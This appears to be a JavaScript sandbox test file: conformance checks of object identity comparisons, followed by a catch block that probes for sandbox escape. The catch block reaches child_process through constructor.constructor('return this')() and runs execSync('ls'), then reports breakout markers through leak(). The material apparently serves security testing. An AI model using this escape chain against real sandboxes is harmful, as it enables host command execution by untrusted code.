try {
    if (new Object() === new Object()) {
        $ERROR('#1: new Object() !== new Object()');
    }
    if (new Object(true) === new Object(true)) {
        $ERROR('#2: new Object() !== new Object()');
    }
    if (new Object(false) === new Object(false)) {
        $ERROR('#3: new Object() !== new Object()');
    }
    if (new Object(+0) === new Object(-0)) {
        $ERROR('#4: new Object(+0) !== new Object(-0)');
    }
    var x, y;
    x = {};
    y = x;
    if (!(x === y)) {
        $ERROR('#5: x = {}; y = x; x === y');
    }
    if (new Boolean(true) === new Number(1)) {
        $ERROR('#6 new Boolean(true) === new Number(1)');
    }
    if (new Number(1) === new String('1')) {
        $ERROR('#7: new Number(1) === new String("1")');
    }
    if (new String('1') === new Boolean(true)) {
        $ERROR('#8: new String("x") === new Boolean(true)');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}